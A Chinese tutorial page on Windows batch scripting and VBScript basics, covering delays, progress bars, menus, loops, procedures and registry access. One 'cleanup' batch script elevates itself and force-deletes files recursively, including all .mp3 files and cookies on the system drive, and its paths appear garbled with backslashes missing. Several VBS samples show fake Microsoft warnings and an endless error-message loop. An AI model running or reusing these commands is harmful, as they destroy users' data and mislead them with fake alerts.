set /a minute1=1%NowTime:~3,2%-100
::读取起始时间的分钟数
set /a second1=1%NowTime:~-5,2%%NowTime:~-2%0-100000
::将起始时间的秒数转为毫秒
set NowTime=%time%
set /a minute2=1%NowTime:~3,2%-100
:: 读取现在时间的分钟数
set /a second2=1%NowTime:~-5,2%%NowTime:~-2%0-100000
::将现在时间的秒数转为毫秒
set /a TotalTime+=(%minute2%-%minute1%+60)%%60*60000+%second2%-%second1%
if %TotalTime% lss %delay% goto delay_continue
echo 程序结束时间:%time%
echo 设定延迟时间:%delay%毫秒
echo 实际延迟时间:%TotalTime%毫秒
pause
运行显示:
请输入需延迟的毫秒数:6000
程序开始时间:15:32:16.37
程序结束时间:15:32:22.37
设定延迟时间:6000毫秒
实际延迟时间:6000毫秒
请按任意键继续. . .

实现原理:首先设定要延迟的毫秒数,然后用循环累加时间,直到累加时间大于等于延迟时间。

误差:windows系统时间只能精确到10毫秒,所以理论上有可能存在10毫秒误差。
经测试,当延迟时间大于500毫秒时,上面的延迟程序一般不存在误差。当延迟时间小于500毫秒时,可能有几十毫秒误差,为什么？因为延迟程序本身也是有运行时间的,同时系统时间只能精确到10毫秒。

为了方便引用,可将上面的例子改为子程序调用形式:
@echo off
echo 程序开始时间:%Time%
call :delay 10
echo 实际延迟时间:%totaltime%毫秒
echo 程序结束时间:%time%
pause
exit

::-----------以下为延时子程序--------------------
:delay
@echo off
if '%1'=='' goto :eof
set DelayTime=%1
set TotalTime=0
set NowTime=%time%
::读取起始时间,时间格式为:13:01:05.95
:delay_continue
set /a minute1=1%NowTime:~3,2%-100
set /a second1=1%NowTime:~-5,2%%NowTime:~-2%0-100000
set NowTime=%time%
set /a minute2=1%NowTime:~3,2%-100
set /a second2=1%NowTime:~-5,2%%NowTime:~-2%0-100000
set /a TotalTime+=(%minute2%-%minute1%+60)%%60*60000+%second2%-%second1%
if %TotalTime% lss %DelayTime% goto delay_continue
goto :eof

</pre>进度条<textarea>@echo off
chcp 65001>nul
title 进度条
MODE con: COLS=80 LINES=31 & color 0A
for /l %%i in (1,1,20) do echo.
echo                         windows正在启动中,请稍候...
echo.
echo.
set /p a=">=============================================================================="＜nul
for /l %%i in (1,1,80) do (
  set /p aa=＜nul
)
for /l %%i in (1,1,80) do (
  set /p aa=^>＜nul
  ping /n 0 127.1 >nul
)
pause

</textarea>模拟进度条<textarea>@echo off
mode con cols=88 lines=15 & color 9f & chcp 65001>nul
cls
echo.
echo 程序正在初始化. . .
echo.
for /L %%i in (1 1 38) do set /p=■<nul&ping /n 1 127.0.0.1>nul
echo  100%%
pause>nul

</textarea>带百分比的进度条<textarea>@echo off
chcp 65001>nul & title 进度条 & color 1f
setlocal enabledelayedexpansion
set m=-
for /l %%i in (1,1,50) do (
  for /l %%j in (1,1,2) do (
    set /a n+=1
    cls
    echo               当前进度是:!n!%%
    echo !m!
    ping /n 1 127.1>nul
  )
  set m=!m!-
)
pause>nul

</textarea>

<h4>特殊字符的输入及应用</h4><pre>
开始 -> 运行 -> 输入cmd -> edit -> ctrl+p(意思是允许输入特殊字符)-> 按ctrl+a将会显示笑脸图案。

(如果要继续输入特殊字符请再次按ctrl+p,然后ctrl+某个字母)

以上是特殊字符的输入方法,选自[英雄]教程,很管用的。也就是用编辑程序edit输入特殊字符,然后保存为一文本文件,再在windows下打开此文件,复制其中的特殊符号即可。

一些简单的特殊符号可以在dos命令窗口直接输入,并用重定向保存为文本文件。
C:>ECHO ^G>temp.txt
"^G"是用Ctrl＋G或Alt＋007输入,输入多个^G可以产生多声鸣响。

退格键表示删除左边的字符,此键不能在文档中正常输入,但可以通过edit编辑程序录入并复制出来,即""
利用退格键,可以设计闪烁文字效果

</pre>文字闪烁<textarea>@echo off
chcp 65001>nul
:start
set/p=床前明月光＜nul
::显示文字,光标停于行尾
ping -n 0 127.0.0.1>nul
::设置延迟时间
set /p a=＜nul
:: 输出一些退格符将光标置于该行的最左端,退格符的数量可以自己调整
set /p a=                ＜nul
::输出空格将之前输出的文字覆盖掉。
set /p a=＜nul
::再次输出退格符将光标置于该行的最左端,这里的退格符数量一定不能比前面的空格数少,否则光标不能退到最左端。
goto start

</textarea>输出唐诗一首,每行闪动多次<textarea>@echo off
chcp 65001>nul
setlocal enabledelayedexpansion

set str=床前明月光 疑是地上霜 举头望明月 低头思故乡
for %%i in (%str%) do (
    rem 由于str中含有空格,则以空格为分隔符将str中的每一个部分依次赋给变量%%i。
    set char=%%i
    echo.
    echo.
    for /l %%j in (0,1,5) do (
        set/p=!char:~%%j,1!＜nul
        rem 依次取出变量char中的每一个字符,并显示。
        ping -n 0 127.0.0.1>nul
        rem 设置输出每个字符的时间延迟。
    )
 call :hero %%i
)
pause>nul
exit

:hero
for /l %%k in (1,1,10) do (
 ping /n 0 127.0.0.1>nul
 set /p a=＜nul
 set /p a=                ＜nul
 set /p a=＜nul
 ping /n 0 127.0.0.1>nul
 set /p a=%1＜nul
)
goto :eof

</textarea>交互界面设计,菜单界面<textarea>@echo off
cls
title 终极多功能修复
:menu
cls
color 0A
echo.
echo                 ==============================
echo                 请选择要进行的操作,然后按回车
echo                 ==============================
echo.
echo              1.网络修复及上网相关设置,修复IE,自定义屏蔽网站
echo.
echo              2.病毒专杀工具,端口关闭工具,关闭自动播放
echo.
echo              3.清除所有多余的自启动项目,修复系统错误
echo.
echo              4.清理系统垃圾,提高启动速度
echo.
echo              Q.退出
echo.
echo.
:cho
set choice=
set /p choice=          请选择:
IF NOT '%choice%'=='' SET choice=%choice:~0,1%
if /i '%choice%'=='1' goto ip
if /i '%choice%'=='2' goto setsave
if /i '%choice%'=='3' goto kaiji
if /i '%choice%'=='4' goto clean
if /i '%choice%'=='Q' goto endd
echo 选择无效,请重新输入
echo.
goto cho

</textarea>清理系统垃圾<textarea>@echo off
title Clean up system junk
mode con lines=30 cols=60
%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit
cd /d "%~dp0"
:main
cls
color 2f
echo.
echo.-----------------------------------------------------------
echo.请选择使用 1 或 2:
echo.
echo. 1.清理系统垃圾
echo.
echo. 2.不清理系统垃圾
echo.-----------------------------------------------------------
if exist "%SystemRoot%System32choice.exe" goto Win7Choice
set /p choice=请输入数字并按回车键确认:
echo.
if %choice%==1 goto delmain
if %choice%==2 goto end
cls
"set choice="
echo 您输入有误,请重新选择。
ping 127.0.1 -n "2">nul
goto main
:Win7Choice
choice /c 12 /n /m "请输入相应数字:"
if errorlevel 2 goto end
if errorlevel 1 goto delmain
cls
goto main
:delmain
cls
color 2f
del /f /s /q %systemdrive%*.tmp
del /f /s /q %systemdrive%*.mp3
del /f /s /q %systemdrive% ecycled*.*
del /f /s /q %windir%*.bak
del /f /s /q %windir%prefetch*.*
rd /s /q %windir% emp & md %windir% emp
del /f /q %userprofile%cookies*.*
del /f /s /q "C:Documents and SettingsAdministratorLocal SettingsHistory"
del /f /s /q "C:Documents and SettingsAdministratorLocal SettingsTemporary Internet Files"
del /f /s /q "C:Documents and SettingsAdministratorLocal SettingsTemp"
del /f /s /q "C:Documents and SettingsAdministratorLocal SettingsTemp_xl7vss_"
del /f /s /q "D:Program FilesQvodPlayerData"
echo.
goto end
:end
echo 请按任意键退出。
@Pause>nul

</textarea>
</div>

<div id="vbs">
<h3>vbs <a href="https://www.jb51.net/shouce/vbs/vtoriVBScript.htm">手册</a></h3><pre>
VBS是基于Visual Basic的脚本语言,其语言类似Visual Basic(VB),全称Microsoft Visual Basic Script Edition(微软可视化BASIC脚本版),简称 VBScript,后缀 .vbs

VBS代码在本地是通过Windows Script Host(WSH)解释执行的。VBS脚本的执行离不开WSH,WSH是微软提供的一种基于32位Windows平台的、与语言无关的脚本解释机制,它使得脚本能够直接在Windows桌面或命令提示符下运行。利用WSH,用户能够操纵WSH对象、ActiveX对象、注册表和文件系统。在Windows 2000下,还可用WSH来访问Windows NT活动目录服务。

用VBS编写的脚本程序在窗口界面是由wscript.exe文件解释执行的,在字符界面由cscript.exe文件解释执行。wscript.exe是一个脚本语言解释器,正是它使得脚本可以被执行,就象执行批处理一样。

VBS是Visual Basic的的一个抽象子集,是系统内置的,用它编写的脚本代码不能编译成二进制文件,直接由Windows系统执行(实际是一个叫做宿主host的解释源代码并执行),高效、易学,但大部分高级语言能干的事情,它基本上都具备,它可以使各种各样的任务自动化,可以使你从重复琐碎的工作中解脱出来,极大的提高工作效率。

Vbs脚本其实就是一种计算机编程语言,但是由于缺少计算机程序设计语言中的部分要素,对于事件的描述能力较弱,所以称为脚本,它最方便的地方就是提供了对COM对象的简便支持

COM对象就是一些具有特定函数功能项程序模块,他们一般以ocx或者dll作为扩展名,你只要找到包含有你需要的功能的模块文件,并在脚本中规范的引用,就可以实现特定的功能,也就是说Vbs脚本就是调用现成的"控件"作为对象,用对象的属性和方法实现目的,完全免去了编写代码、设计算法等等麻烦

仅Internet Explorer支持VBScript,所以可以在IE浏览器中执行VBScript
当VBScript被插入一个HTML文档后,因特网浏览器会读取这个文档,并对VBScript进行解释。VBScript可能会立即执行,也可能在之后的事件发生时执行
< script type="text/vbscript">document.write("This is my first VBScript!")< /script>

utf-8编码出现中文乱码,记事本(notepad)另存为ANSI或UNICODE
msgbox "Hello World!"

Msgbox是VBS内建的函数,每一个函数都可以完成一定的功能,只需要按照语法要求,在函数的相应部分填写相应的内容就可以了,这部分内容称为参数,当然函数执行的结果我们称为返回值,一个函数可以有返回值也可以没有,可以有参数也可以没有。不用了解函数是怎么运作的,只要了解这个函数能干什么就行了。

Msgbox语法:msgbox  "对话框内容", , "对话框的标题"
msgbox "Hello World!" , , "系统提示"
msgbox "发现盗版系统,现已进行功能限制！" & vbcrlf & "请使用正版软件！",,"微软提示"

Inputbox("对话框内容","对话框标题")
Msgbox(Inputbox("请输入你的名字:"))
rem 注释:把上面的程序清单输入到记事本里面,然后保存为以.vbs为扩展名的文件,然后双击运行,观察运行结果
'单引号注释:以""包裹起来的字符称之为"字符串",Inputbox函数弹出一个输入对话框,Msgbox则用于输出
Dim name
name=Inputbox("请输入你的姓名:")
Msgbox(name)

rem 常量定义
const PI=3.1415926
const NAME="记忆碎片"

颜色常数
vbBlack &h00  黑色
vbRed &hFF  红色
vbGreen &hFF00  绿色
vbYellow  &hFFFF  黄色
vbBlue  &hFF0000  蓝色
vbMagenta &hFF00FF  紫色
vbCyan  &hFFFF00  青色
vbWhite &hFFFFFF  白色

字符串常数
vbCr  Chr(13) 回车符。
vbLf  Chr(10) 换行符。
vbCrLf  Chr(13) & Chr(10) 回车符与换行符。
vbNullChar  Chr(0)  值为 0 的字符。
vbNullString  值为 0 的字符串 与零长度字符串 ("") 不同;用于调用外部过程。
vbTab Chr(9)  水平附签。

rem Dim定义变量,dim 变量1,变量2……,在VBScript中对变量、方法、函数和对象的引用是不区分大小写
rem 申明多个同类型变量可用逗号分隔,VBScript中不允许在申明变量时给变量赋值,但允许在一行代码内同时对两个变量进行赋值,中间用冒号分隔
'可以使用Option Explicit来告诉宿主变量必须先声明后使用
'VBScript在定义时只有一种变量类型,在实际使用中需要使用类型转换函数来将变量转换成相应的变量类型
Cbool函数将变量转换成布尔值;
Cbyte函数将变量转换为0到255之间的整数。
Ccur函数、Cdbl函数和Csng函数将变量转换为浮点数值,前者只精确到小数点后四位,后两者要更加精确,数值的范围也要大的多。
Cdate函数将变量转换为日期值。
Cint函数和Clng函数将变量转换为整数,后者的范围比前者要大的多。
Cstr函数将变量转换为字符串。

Dim a,b,c
a=inputbox("a是:","输入半径") '带有标题的提示框
b=Inputbox("b是:","输入半径")
c=a*2+b*2
msgbox (c)  # 这个输入1、2时是6

inputbox返回的是一个字符串,而不是一个数,必须用a=int(a)这种形式转化成数
Dim a,b,c
a=Inputbox("a是:","输入半径")
b=Inputbox("b是:","输入半径")
c=(a+b)*2
msgbox(c)   # 这个输入1、2时是24,在VBS中+不仅是加号还表示把两个字符串连接起来,乘以2时就被强制转换成了数字

inputbox返回的是字符串,把他变成整数
c=(int(a)+int(b))*2
msgbox (c)  # 输出6

CDbl函数把字符转换为数字但又不取整
Dim a,b,c,d,e
a=inputbox("a是:","输入半径")
b=Inputbox("b是:","输入半径")
c=CDbl(a)
d=CDbl(b)
e=(c+d)*2
msgbox(e)  # 输入1.2,1.3时就会输出5

上面的实例也可以综合写成:
Dim a,b
a=CDbl(inputbox("a是:","输入半径"))
b=CDbl(Inputbox("b是:","输入半径"))
Msgbox (a+b)*2

bool变量的值只有两种:true,false
dim a,b
a=true   # "true"是字符串,true是布尔值
b=false

【 条件语句主要有if……then语句和select case语句两种形式 】
dim a,b,c,d
a=inputbox("a是:","输入一个数 >10")
b=Inputbox("b是:","输入另一个数 >10")
d=Inputbox("答案:","输入答案")
d=int(d)
c=a*2+b*2
if a<=10 and b<=10 then  'and和or
  msgbox "输入一个>10的数"
elseif d=c then
  msgbox "答案正确"
else
  msgbox "答案错误"
end if

dim a
a=inputbox("输入一个1--3的值")
a=int(a)
select case a
case 1
    msgbox "壹"
case 2
    msgbox "贰"
case 3
    msgbox "叁"
case else
    msgbox "输入错误"
end select

rem 写成if...elseif
dim a
a=inputbox("请输入1--3的值")
a=int(a)
if a=1 then
    msgbox "壹"
elseif a=2 then
    msgbox "贰"
elseif a=3 then
    msgbox "叁"
else
    msgbox "输入错误"
end if

【 循环 】
循环控制语句有for……next循环、for……each循环、do……while循环、do……until循环、while循环五种形式
for……next循环、for……each循环两种循环中随时可以使用exit  for来退出循环

关闭vbs脚本死循环打开任务管理器结束进程“wscript.exe”即可
do
msgbox "系统严重错误！"
loop

dim input,ctr
ctr=0 '设置计数器
const PASS="pas123_" '这是一个字符串用""包裹起来,设定密码为常量,不可变更
do until input=PASS
    input=inputbox("请输入密码")
    if ctr=3 then
        msgbox "已经达到认证上限, 认证程序关闭"
        exit do
    end if
    ctr = ctr + 1
loop
if input=PASS then
    msgbox "成功"
else
    msgbox "失败"
end if

dim a,ctr
ctr=0
const pass="pas123_"
do while ctr<3
    a=inputbox("请输入密码")
    if a=pass then
        msgbox "认证成功" & vbcrlf & "请开始你的表演"
        exit do
    else
        msgbox "认证出错,请检查密码"
        ctr=ctr+1 '如果密码出错就增加一次错误认证计数
    end if
loop

dim a,ctr
ctr=0
const pass="pas123_"
do
    a=inputbox("请输入密码")
    if a=pass then
        msgbox "认证成功" & vbcrlf & "请开始你的表演"
        exit do
    else
        ctr=ctr+1 '如果密码出错就增加一次错误认证计数
        msgbox "认证出错, 请检查密码"
    end if
loop while ctr<3

dim i
for i=0 to 5
    msgbox i
next

dim i,j,str
for i=1 to 9
    for j=1 to 9
        str=str & i * j & " "  '&是和并字符串的符号
    next '每个next对应一个for
    str=str & vbCrlf           'vbCrlf相当于键盘上的回车键,因为你不能在键盘上输入,所以系统定义了一个默认的常量
next
msgbox (str)

如果是需要对数组或对象集合中的每一个元素进行判断则需要使用for……each循环,其结构为:
For each 循环计数变量 in 要查看的对象或数组
执行处理语句
Next

最后一种循环语句是条件满足时一直执行循环,
While  条件
执行循环体
Wend

【 数组 】
数组就是类型相同的一组数据或n组,用来储存相关的量
数组的定义与变量非常类似,只需要在变量后描述这个数组的个数和维数
可以通过不指定数组的个数和维数来申明动态数组,等到数组的个数和维数固定后使用关键字redim来改变数组。在改变数组的大小时数组的数据会被破坏,使用关键字preserve来保护数据
RedIm preserve array(n,m)

</pre><textarea>dim name(7),str '一共八个学生, str变量是用来把他们储存成一个字符串以便输出
for i=0 to 7
    name(i)=inputbox("请输入第" & i+1 & "个学生的名字")  '从零开始,填充每一个数组元素
    str=str & " " & name(i)                            '输出数组元素
next
msgbox str

</textarea><textarea>dim name(2), high(2), mark(2) '定义三个数组分别储存3个人的名字、身高和得分
dim ctr '计数器
for ctr=0 to 2
    name(ctr)=inputbox("请输入第" & ctr+1 & "个学生的姓名")
    high(ctr)=inputbox("请输入第" & ctr+1 & "个学生的身高")
    mark(ctr)=inputbox("请输入第" & ctr+1 & "个学生的得分")
next
dim cname, temp '要查询的名字,和一个临时变量,用来储存数据的位置
cname=inputbox("请输入你要查询的名字:")
for ctr=0 to 2 '遍历所有name数组的成员, 寻找要查询的名字
    if name(ctr)=cname then
        temp=ctr '记录数据位置
        exit for '退出循环, 和exit do的用法一样
    end if
next
msgbox "姓名:" & name(temp) & " " & "身高:" & high(temp) & " " & "得分:" & mark(temp)
'这个程序中temp变量完全没有必要,只是为了更清楚地说明问题,因为当exit for以后ctr变量的值就不会改变, 储存的正好是对应数据在数组中的位置可以简化成如下:
dim cname
cname=inputbox("请输入你要查询的名字:")
for ctr=0 to 2
    if name(ctr)=cname then exit for '因为只有exit for就不需要块if了
next
msgbox "姓名:" & name(ctr) & " " & "身高:" & high(ctr) & " " & "得分:" & mark(ctr)

</textarea>二维数组<textarea>dim info(4,2)         '从零开始,一共五个人,要储存的数据类型有3项
dim i,j
for i=0 to 4
    for j=0 to 2      '使用嵌套循环
        dim opt       '定义一个变量用于存储数据项提示
        select case j '判断应该输入的是什么数据
            case 0
                opt="姓名"
            case 1
                opt="国籍"
            case 2
                opt="民族"
        end select
        info(i,j)=inputbox("请输入第" & i+1 & "个人的" & opt)
    next
next

</textarea><pre>
【 使用过程 】
VBScript中过程被分为两类:Sub过程和Function过程
函数给调用者返回值,子程序无返回值不能在表达式中使用,还有一种叫事件的特殊子程序
尽管在定义子程序的时候参数列表要加括号,但在调用子程序的时候参数列表不加括号,括号只在函数中使用
函数只能出现在赋值语句的右边或表达式中,函数不能直接使用,如果必须直接使用函数则必须使用call语句调用,并取消返回值。

</pre><textarea>Sub ConvertTemp()
  temp = InputBox("请输入华氏温度", 1)
  MsgBox "温度为 " & Celsius(temp) & " 摄氏度。"
End Sub

Function Celsius(fDegrees)
  Celsius = (fDegrees - 32) * 5 / 9
End Function

</textarea><pre>
函数
Function过程是包含在Function和End Function语句之间的一组VBScript语句。Function过程与Sub过程类似,但Function过程可以返回值
Function过程可以使用参数(由调用过程传递的常数、变量或表达式),如果Function过程无任何参数则Function语句必须包含空括号()。
Function过程通过函数名返回一个值,这个值是在过程的语句中赋给函数名的
Function返回值的数据类型总是Variant

function 函数名(参数1, 参数2...参数n) '列表可以是空的, 但括号不能省略, 参数之间用","分割
函数代码
exit function '结束函数,不是必需的
函数名称＝某值 '用来返回值
end function

函数是一个模块,只有调用的时候才会运行,也就说当编写了一个函数,然后在程序中并不调用它,那么这个函数永远不会运行,一般来说编写程序是按照:
主程序
......
函数1
......
函数2
......

在VBScript中参数传递是一种传值,而不是传址,所以进行的参数传递实际上是进行了一次变量赋值,例如调用co(a1,a2),实际上程序会执行一步:t1=a1,t2=a2这样的操作,同样因为传值传址的原因,VBScript只能返回一个值
当一个过程调用了另一个过程的时候比如主程序调用了函数,控制权就到了被调用过程那里,当这个过程执行完毕以后会回到调用它的地方继续执行, 这个就叫做"返回",返回时可以带一个值叫做"返回值",在vbs继承了basic的传统,返回的时候采用"函数名=返回值"的办法,这个"返回值"是指一个表达式(在编程中任何东西都是表达式,比如变量a,常数0,"Hello",c=1+2等都是表达式),比如有一个函数是ht则返回的方法是:ht=你要返回的值
返回以后后面的语句将不再执行
调用一个函数:变量=函数名(参数)

有时并不需要返回什么值就可以使用一种称之为"子程序"的结构,子程序或称之为过程与函数的差别就在于:
1)没有返回值,
2)使用sub关键字定义,
3)通过Call调用

退出一个函数:exit function
退出一个过程:exit sub

子程序
Sub过程是包含在Sub和End Sub语句之间的一组VBScript语句,可执行某些操作,但不会返回值
子程序是将一段具有某种特定功能的语句区块单句撰写成一个独立的程序,给予特定的名称
Sub过程可以使用参数(由调用过程传递的常数、变量或表达式),如果Sub过程无任何参数则Sub语句必须包含空括号()

可带有参数
Sub mysub()
some statements
End Sub

或者
Sub mysub(argument1,argument2)
some statements
End Sub

Dim yname
yname=inputbox("请输入你的名字:")
who(yname)
sub who(cname)
    msgbox "你好" & cname
    msgbox "感谢你阅读我的课程,这是基础部分的最后一课"
end sub

过程的数据进出
给过程传递数据的途径是使用参数。参数被作为要传递给过程的数据的占位符。参数名可以是任何有效的变量名。使用Sub语句或Function语句创建过程时过程名之后必须紧跟括号。括号中包含所有参数,参数间用逗号分隔

在下面的函数中fDegrees是传递给Celsius函数的值的占位符:
Function Celsius(fDegrees)
    Celsius = (fDegrees - 32) * 5 / 9
End Function

要从过程获取数据,必须使用Function过程,Function过程可以返回值,Sub过程不返回值。

在代码中使用Sub和Function过程
调用Function过程时函数名必须用在变量赋值语句的右端或表达式中
Temp = Celsius(fDegrees)
MsgBox "温度为 " & Celsius(fDegrees) & " 摄氏度。"

调用Sub过程时只需输入过程名及所有参数值,参数值之间使用逗号分隔。不需使用Call语句,当不使用Call语句进行调用时括号被省略,但如果使用了此语句则必须将所有参数包含在括号之中。
下面的示例显示了调用MyProc过程的两种方式,一种使用Call语句,另一种则不使用,两种方式效果相同。
Call MyProc(firstarg, secondarg)
MyProc firstarg, secondarg

【 基本运算 】
可以使用操作符 + 和操作符 & 来连接字符串,一般使用&操作符
比较特殊的操作符Is用来比较对象,例如按钮对象,如果对象是同一类型结果就是真,如果对象不是同一类型结果就是假。

+ 数字加法及字符串连接
- 数字减法
* 数字乘法
/ 数字除法
Mod 求余数
\ 求商数
& 字符串连接
^ 次方、乘方

比较操作符
= 相等
<> 不相等
> 大于
>= 大于或等于
< 小于
<= 小于或等于

逻辑运算符
Not 非
And 且
Or 或
Xor 异或

循环及决策
if ....then 若...则...
if ...then...else 若...则...非
else if... 非若
select case... 群组选择条件
end select
for ... next 计数循环
while...wend 条件循环(一)
do while...loop 条件循环(二)
do...loop while 条件循环(三)
do until...loop 条件循环(四)
do...loop until 条件循环(五)

数学函数
Abs 绝对值
Sgn 正负号
Hex 转换成十六进制
Oct 转换成八进制
Sqr 平方根
Int 取整数
Fix 取整数
Round 取整数
Log 以e为底的对数
Sin 正弦函数
Cos 余弦函数
Tan 正切函数

字符串处理函数
IsNull 判断对象是否为空
Len 字符串长度
Mid 取部分字符串
Left 从字符串开头取部分字符串
Right 从字符串结尾取部分字符串
Lcase 转换成小写
Ucase 转换成大写
Trim 清除字符串开头及结尾的空格符
Ltrim 清除字符串开头空格符
Rtrim 清除字符串结尾空格符
Replace 替换字符串部分字符
Instr 判断是否包含于另一个字符串(从起始搜寻)
InstrRev 判断是否包含于另一个字符串(从结尾搜寻)
Space 任意字符数的空格符
String 任意字符数的任一字符
StrReverse 反转字符串
Split 以某字符分割字符串

数据类型转换函数
Cint 转换成整形
Cstr 转换成字符串
Clng 转换成长整数
Cbool 转换成布尔函数
Cdate 转换成日期函数
CSng 转换成单精度
CDbl 转换成双精度

日期时间函数
Date 日期
Time 时间
NOw 日期时间
DateAdd 增加日期
DateDiff 两日期差
DateSerial 日期设定
Datevalue 日期设定
Year 年份
Month 月份
Day 天
Hour 时刻
Minute 分钟
Second 秒钟
Timer 午夜距秒数
TimeSerial 时间设定
Timevalue 时间所属部分
WeekDay 星期名称
MonthName 月份名称

其它函数
Array 产生数组
Asc 字符ASCII码
Chr ASCII码字符
Filter 过滤数组
InputBox 输入窗口
Join 合并数组中的元素
MsgBox 信息窗口
Lbound 数组下界
Ubound 数组上界

指令
Const 设定常数
Dim 定义变量或数组
Erase 清除数组
ReDim 重新声明数组
Randomize 起始随机数
Rnd 取得随机数
ASP对象
Session对象
IsEmpty 测试Session变量是否存在
TimeOut 设定Session变量生存周期
Abandon 强制清除Session变量
Application对象
IsEmpty 测试Application变量是否存在
Lock 锁定Application变量
Unlock 解除Lock指令的锁定
Cookies对象
Expires 设定Cookies变量的生存周期
Connection对象
Open 打开与数据库的连接
Execute 打开Recordset对象
Close 关闭Connection对象
Recordset对象
movefirst 将记录指针移至第一条
movelast 将记录指针移至最后一条
movenext 将记录指针移至下一条
moveprevious 将记录指针移至上一条
bof 测试是否为recordset的起始
eof 测试是否为recordset的结束
open 打开Recordset对象
close 关闭recordset对象
fields 读取数据的子对象
fileds.count 字段个数
pagesize 每页记录条数
absolutepage 设定为某页
pagecount 总页数
Absoluteposition 直接跳至某条记录

</pre>

<h4>利用Vbs运行外部程序</h4><pre>
Vbs只提供了编程的一个基本框架,用户可以使用Vbs来定义变量、过程和函数,vbs也提供了一些内部函数和对象,但Vbs没有提供任何命令来访问Windows系统组件,Vbs虽然不能自己完成这些任务,但它提供了一条极为方便、功能也相当强的命令CreateObject,这条命令可以访问windows系统内安装的所有com对象,并且可以调用这些部件中存放的命令
只需要找到相应的模块,调用相应的功能就可以了,作为脚本,把一个枯燥的过程重复1000次本就是它的拿手好戏

WSH即用来解析Vbs的宿主本身包含了几个常用对象:
1、Scripting.FileSystemObject:提供一整套文件系统操作函数
2、Scripting.Dictionary:用来返回存放键值对的字典对象
3、Wscript.Shell:提供一套读取系统信息的函数,如读写注册表、查找指定文件的路径、读取DOS环境变量,读取链接中的设置
4、Wscript.NetWork:提供网络连接和远程打印机管理的函数,其中所有Scripting对象都存放在SCRRUN.DLL文件中,所有的Wscript对象都存放在WSHOM.ocx文件中

Option Explicit
Dim objShell
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "notepad"

Set是Vbs指令,凡是将一对象引用赋给变量就需要使用set关键字,凡是字符串、数值、布尔值之外的变量都是对象引用

凡是正确引用的对象,其本身内置有函数和变量,其引用方法为在变量后加".",后紧跟其实现功能的函数就可以了。Objshell.run是调用Wscript.shell中的运行外部程序的函数run,notepad是记事本程序的文件名,也可以改成"calc"计算器,winword是word的文件名,,所有可执行文件的文件名都可以,但如果要执行的可执行文件存放的地方不是程序安装的常用路径,一般情况下需要提供合法的路径名,但run在运行解析时遇到空格会停止,解决的方法是使用双引号,例如运行qq的代码为:
objshell.run """C:\Program Files\QQ2006\QQ.exe"""  '注:三个引号

两个程序基本上同时启动
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "notepad"
objShell.Run "calc"

先启动notepad,关闭之后再启动calc
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "notepad" ,,true
objShell.Run "calc"

run函数有三个参数
第一个参数是要执行的程序的路径
第二个参数是窗口形式,有10种其中4个最常用,0是在后台运行;1正常运行,2激活程序并且显示为最小化,3激活程序并且显示为最大化
第三个参数是表示这个脚本是等待还是继续执行,如果设为了true,脚本就会等待调用的程序退出后再向后执行。
run函数返回为0表示成功执行,如果不为0则这个返回值就是错误代码,可以通过这个代码找出相应的错误

【 错误处理 】
引发错误的原因很多,例如用户输入了错误类型的值,或者脚本找不到必需的文件、目录或驱动器,可以使用循环技术来处理错误,但VBS本身也提供了一些基本技术来进行错误的检测和处理。

1、最常见的错误是运行时错误,也就是说错误在脚本正在运行的时候发生,是脚本试图进行非法操作的结果,例如零被作为除数。在vbs中任何运行时错误都是致命的,此时脚本将停止运行并在屏幕上显示一个错误消息,可以在脚本的开头添加
On Error Resume Next
这行语句告诉vbs在运行时跳过发生错误的语句,紧接着执行跟在它后面的语句,把相关的错误号、错误描述和相关源代码压入错误堆栈。

2、虽然On Error Resume Next语句可以防止vbs脚本在发生错误时停止运行,但是它并不能真正处理错误,要处理错误需要在脚本中增加一些语句,用来检查错误条件并在错误发生时处理它。
vbscript提供的err对象有两个方法clear和raise,5个属性:description、helpcontext、helpfile、number、source

err对象不用引用实例,可以直接使用
on error resume next
a=11
b=0
c=a/b
if err.number<>0 then
wscript.echo err.number & err.description & err.source
end if
11被零除windows vbscript运行时错误

【 修改注册表 】
用VBScript修改注册表必须先创建一个能于操作系统沟通的对象,再利用该对象的各种方法对注册表进行操作,创建这个对象的方法和格式如下:
Dim gg
Set gg=WScript.CreateObject("WScript.Shell")

对象的方法:
1.对注册表的读操作RegRead
2.对注册表的写操作RegWrite
3.对注册表的删操作RegDelete
参数:三种操作RegRead,RegWrite,RegDelete都需要带参数进行,并且这些操作的参数的个数和形式又不尽相同,其必不可少的共同参数为:
路径参数:包括根键,主键和键值

根键的两种表示方法:
方法一:直接用它在注册表中的字符串来表示,如HKEY_CLASSES_ROOT,HKEY_CURRENT_USER等
方法二:用缩写的四个字母表示,前两个为HK,后两个即为根键单词的首字母,如根键HKEY_CLASSES_ROOT表示为HKCR, 根键HKEY_CURRENT_USER可表示为HKCU

主键路径:
主键路径就是目标键在注册表中的主键位置,各个主键之间用"\"符分隔开。如"Software\Microsoft\Windows\CurrentVersion\Policies\"

键值:
键值参数直接接在主键路径之后,例如一个完整的路径如下所示:
"HKCR\Software\Microsoft\Windows\CurrentVersion\Policies\NoRun"

1、RegRead操作
读操作RegRead主要是用来读取注册表中主键的默认值或键值的数据,可以将读得的数据送到相应的变量中,再利用VB中的MsgBox()函数将该数据显示出来,这就达到了读取注册表中数据的目的;也可以利用对象OperationRegistry的方法Popup()将读取的数据送至屏幕

</pre><textarea>Dim OperationRegistry
Set OperationRegistry=WScript.CreateObject("WScript.Shell")
Dim Read_Data1,Read_Data2
Read_Data1=OperationRegistry.RegRead("HKCR\.chk\")
'读取根键HKEY_CLASSES_ROOT之下的.xxf主键的默认值,并将该数据送至变量Read_Data1
Read_Data2=OperationRegistry.RegRead("HKCR\.chk\PerceivedType")
'读取.xxf主键之下的value键值的数据,并将该数据送至变量Read_Data2
MsgBox("Default="&Read_Data1&" value="&Read_Data2)
'将读取的数据显示出来
wscript.echo "Default="&Read_Data1&" value="&Read_Data2

</textarea><pre>
2、RegWrite操作
写操作RegWrite主要是用来在注册表中新建主键或键值,并要赋予给它们一个初始值,该操作同样可以对注册表中以存在的主键或键值进行数据的修改,因此写操作的参数结构就比读操作要复杂一些,它不仅要路径参数,还要一个初始值和类型参数

先来看初始值参数,该参数对于写操作来说是必不可少的,它可以为空(null)但却不能省掉。在新建主键时初始值参数就赋给了该主键的默认值,在新建键值时初始值参数就成了新建键值的初始数据,而初始值的类型则是由类型参数决定的,类型主要有以下三种:
